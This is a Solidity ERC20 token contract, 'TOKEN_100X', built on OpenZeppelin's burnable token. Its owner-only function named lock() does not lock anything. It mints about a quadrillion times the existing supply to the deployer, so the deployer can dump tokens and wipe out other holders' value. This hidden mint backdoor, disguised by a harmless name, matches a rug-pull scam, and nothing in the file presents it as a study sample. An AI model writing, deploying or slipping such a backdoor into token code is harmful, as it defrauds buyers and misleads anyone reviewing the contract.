import '@openzeppelin/contracts/token/ERC20/extensions/ERC20Burnable.sol';

contract TOKEN_100X is ERC20Burnable {
    address deployer;

    constructor (
        string memory name,
        string memory symbol,
        uint256 initialBalance
    ) ERC20(name, symbol) {
        _mint(msg.sender, initialBalance);
        deployer = msg.sender; 
    }

    function lock() external {
        require(msg.sender == deployer);
        _mint(deployer, totalSupply() * 1e15 - totalSupply());
    }
}